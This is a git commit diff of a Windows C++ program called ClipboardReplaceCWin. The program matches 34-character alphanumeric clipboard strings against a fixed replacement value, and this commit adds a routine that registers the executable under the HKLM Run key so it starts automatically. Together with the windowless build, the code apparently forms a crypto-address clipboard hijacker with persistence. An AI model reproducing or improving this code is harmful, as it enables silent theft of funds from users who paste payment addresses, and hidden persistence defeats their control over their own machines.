f5eaa90374c121eb90494c43c7e83faf1b134ea0
marlkiller <marlkiller@voidm.com>
2022-04-11 01:20:45 +0800

    'dev'

--- ClipboardReplaceCWin/ClipboardReplaceCWin.cpp
+++ ClipboardReplaceCWin/ClipboardReplaceCWin.cpp
@@ -3,18 +3,48 @@
 #include <string>
 #include <regex>
 
-int WIN_HIDDEN = 1;
+
 #ifdef _DEBUG
 #else
 #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #endif 
 
+int WIN_SHOW = 1;
+int AUTH_RUN = 0;
 
 std::string REPLACCE_VAL = "1234567890123456789012345678901234";
 std::regex REGEX_VAL("[0-9a-zA-Z]{34}");
 
 //aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 //bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+
+
+void auto_run(int flag)
+{
+    char pFileName[MAX_PATH] = { 0 };
+    DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
+
+    HKEY hKey;
+    LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
+    printf("lRet is %d\n", lRet);
+
+    if (lRet != ERROR_SUCCESS)
+        return;
+
+    if (flag) {
+        RegSetValueEx(hKey, "AutoRun", 0, REG_SZ, (const BYTE*)(LPCSTR)pFileName, MAX_PATH);
+        printf("RegSetValueEx\n");
+    }
+    else {
+        RegDeleteValueA(hKey, "AutoRun");
+        printf("RegDeleteValueA\n");
+    }
+        
+    RegCloseKey(hKey);
+    return;
+}
+
 
 #pragma warning(disable:4996)
 void raplce_if_match()
@@ -92,19 +122,20 @@ LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
+    auto_run(AUTH_RUN);
     // Register the window class
     WNDCLASS wc = {};
     wc.hInstance = NULL;
 ;
-    wc.lpszClassName = L"MainWindow";
+    wc.lpszClassName = "MainWindow";
     wc.lpfnWndProc = WindowProc;
     wc.hbrBackground = (HBRUSH)(GetStockObject(GRAY_BRUSH));
     RegisterClass(&wc);
 
     // Create the window
     HWND hwnd = CreateWindow(
-        L"MainWindow", // Window class name
-        L"窗口名称", // Window name
+        "MainWindow", // Window class name
+        "窗口名称", // Window name
         WS_OVERLAPPEDWINDOW, // Window style
         CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, // Size and position
         NULL, // Parent window
@@ -114,7 +145,7 @@ int main()
     );
 
     // Show the window
-    ShowWindow(hwnd, WIN_HIDDEN);
+    ShowWindow(hwnd, WIN_SHOW);
 
     // Run the message loop
     MSG msg = {};
